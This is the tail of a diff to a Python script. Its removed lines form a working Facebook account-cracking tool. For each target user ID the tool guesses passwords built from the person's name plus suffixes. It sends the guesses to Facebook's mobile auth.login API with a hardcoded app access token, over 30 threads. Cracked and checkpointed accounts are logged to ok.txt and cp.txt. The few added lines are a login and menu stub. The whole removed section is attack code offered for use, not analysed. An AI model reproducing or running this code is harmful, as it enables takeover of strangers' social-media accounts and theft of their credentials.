-						ok = open("ok.txt", 
-
-"a")
-						ok.write(uid
-
-+"|"+pass2+"\n")
-						ok.close()
-						oks.append(uid
-
-+pass2)
-					else:
-						if 
-
-"www.facebook.com" in q["error_msg"]:
-							print(" 
-
-\033[1;33m [EFK-CP] "+uid+" | "+pass2+"\033[0;97m")
-							cp = open
-
-("cp.txt", "a")
-							cp.write
-
-(uid+"|"+pass2+"\n")
-							cp.close()
-							cps.append
-
-(uid+pass2)
-						else:
-							pass3 = 
-
-name.lower().split(' ')[0]+p3
-							data = 
-
-session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass3+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-							q = 
-
-json.loads(data)
-							if 
-
-"access_token" in q and "EAAA" in q:
-								
-
-print(" \033[1;32m [EFKOK] "+uid+" | "+pass3+"\033[0;97m")
-								ok = 
-
-open("ok.txt", "a")
-								
-
-ok.write(uid+"|"+pass3+"\n")
-								
-
-ok.close()
-								
-
-oks.append(uid+pass3)
-							else:
-								if 
-
-"www.facebook.com" in q["error_msg"]:
-									
-
-print(" \033[1;97m [EFK-CP] "+uid+" | "+pass3+"\033[1;93m")
-									
-
-cp = open("cp.txt", "a")
-									
-
-cp.write(uid+"|"+pass3+"\n")
-									
-
-cp.close()
-									
-
-cps.append(uid+pass3)
-								
-
-else:
-									
-
-pass4 = name.lower().split(' ')[0]+p4
-									
-
-data = session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass4+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-q = json.loads(data)
-									
-
-if "access_token" in q and "EAAA" in q:
-									
-
-	print(" \033[1;32m [EFK-OK] "+uid+" | "+pass4+"\033[0;97m")
-									
-
-	ok = open("ok.txt", "a")
-									
-
-	ok.write(uid+"|"+pass4+"\n")
-									
-
-	ok.close()
-									
-
-	oks.append(uid+pass4)
-									
-
-else:
-									
-
-	if "www.facebook.com" in q["error_msg"]:
-									
-
-		print(" \033[1;33m [EFK-CP] "+uid+" | "+pass4+"\033
-
-[0;97m")
-									
-
-		cp = open("cp.txt", "a")
-									
-
-		cp.write(uid+"|"+pass4+"\n")
-									
-
-		cp.close()
-									
-
-		cps.append(uid+pass4)
-									
-
-	else:
-									
-
-		data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass5+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-		q = json.loads(data)
-									
-
-		if "access_token" in q and "EAAA" in q:
-									
-
-			print(" \033[1;32m [EFK-OK] "+uid+" | 
-
-"+pass5+"\033[0;97m")
-									
-
-			ok = open("ok.txt", "a")
-									
-
-			ok.write(uid+"|"+pass5+"\n")
-									
-
-			ok.close()
-									
-
-			oks.append(uid+pass5)
-									
-
-		else:
-									
-
-			if "www.facebook.com" in q["error_msg"]:
-									
-
-				print(" \033[1;97m [EFK-CP] "+uid+" 
-
-| "+pass5+"\033[1;93m")
-									
-
-				cp = open("cp.txt", "a")
-									
-
-				cp.write(uid+"|"+pass5+"\n")
-									
-
-				cp.close()
-									
-
-				cps.append(uid+pass5)
-									
-
-			else:
-									
-
-				data = session.get("https://b-
-
-api.facebook.com/method/auth.login?format=json&email="+uid
-
-+"&password="+pass6+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-				q = json.loads(data)
-									
-
-				if "access_token" in q and "EAAA" in 
-
-q:
-									
-
-					print(" \033[1;32m [EFK-OK] 
-
-"+uid+" | "+pass6+"\033[0;97m")
-									
-
-					ok = open("ok.txt", "a")
-									
-
-					ok.write(uid+"|"+pass6+"\n")
-									
-
-					ok.close()
-									
-
-					oks.append(uid+pass6)
-									
-
-				else:
-									
-
-					if "www.facebook.com" in q
-
-["error_msg"]:
-									
-
-						print(" \033[1;33m 
-
-[EFK--CP] "+uid+" | "+pass6+"\033[0;97m")
-									
-
-						cp = open("cp.txt", 
-
-"a")
-									
-
-						cp.write(uid
-
-+"|"+pass6+"\n")
-									
-
-						cp.close()
-									
-
-						cps.append(uid
-
-+pass6)
-									
-
-					else:
-									
-
-						data = session.get
-
-("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass7+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-						q = json.loads(data)
-									
-
-						if "access_token" in 
-
-q and "EAAA" in q:
-									
-
-							print(" 
-
-\033[1;32m [EFK-OK] "+uid+" | "+pass7+"\033[0;97m")
-									
-
-							ok = open
-
-("ok.txt", "a")
-									
-
-							ok.write
-
-(uid+"|"+pass7+"\n")
-									
-
-							ok.close()
-									
-
-							oks.append
-
-(uid+pass7)
-									
-
-						else:
-									
-
-							if 
-
-"www.facebook.com" in q["error_msg"]:
-									
-
-								
-
-print(" \033[1;97m [EFK--CP] "+uid+" | "+pass7+"\033[1;93m")
-									
-
-								cp = 
-
-open("cp.txt", "a")
-									
-
-								
-
-cp.write(uid+"|"+pass7+"\n")
-									
-
-								
-
-cp.close()
-									
-
-								
-
-cps.append(uid+pass7)
-									
-
-							else:
-									
-
-								
-
-pass8 = name.lower().split(' ')[1]+p1
-									
-
-								data 
-
-= session.get("https://b-api.facebook.com/method/auth.login?
-
-format=json&email="+uid
-
-+"&password="+pass8+"&credentials_type=device_based_login_password&g
-
-enerate_session_cookies=1&error_detail_type=button_with_disabled&sou
-
-rce=device_based_login&meta_inf_fbmeta=
-
-%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_coun
-
-try_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.
-
-HeadersV2ConfigFetchRequestHandler&access_token=350685531728|
-
-62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authentica
-
-te&cpl=true", headers=header).text
-									
-
-								q = 
-
-json.loads(data)
-									
-
-								if 
-
-"access_token" in q and "EAAA" in q:
-									
-
-									
-
-print(" \033[1;32m [EFK-OK] "+uid+" | "+pass8+"\033[0;97m")
-									
-
-									
-
-ok = open("ok.txt", "a")
-									
-
-									
-
-ok.write(uid+"|"+pass8+"\n")
-									
-
-									
-
-ok.close()
-									
-
-									
-
-oks.append(uid+pass8)
-									
-
-								
-
-else:
-									
-
-									
-
-if "www.facebook.com" in q["error_msg"]:
-									
-
-									
-
-	print(" \033[1;97m [EFK-CP] "+uid+" | "+pass8+"\033[1;93m")
-									
-
-									
-
-	cp = open("cp.txt", "a")
-									
-
-									
-
-	cp.write(uid+"|"+pass8+"\n")
-									
-
-									
-
-	cp.close()
-									
-
-									
-
-	cps.append(uid+pass8)
-									
-
-			
-									
-
-	
-									
-
-	
-		except:
-			pass
-	p = ThreadPool(30)
-	p.map(main, id)
-	print("")
-	linex()
-	print("")
-	print("\033[93;1m THE PROCESS HAS BEEN COMPLETED")
-	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: 
-
-"+str(len(oks))+"/"+str(len(cps)))
-	print("")
-	linex()
-	print("")
-	raw_input("\033[93;1m PRESS ENTER TO BACK ")
-	menu()
-	
-if __name__ == '__main__':
-	main()
+        ck=login()
+        cokie={"cookie":ck}
+        menu()
+    except Exception as e:
+        sys.exit(f"{er}{e}")
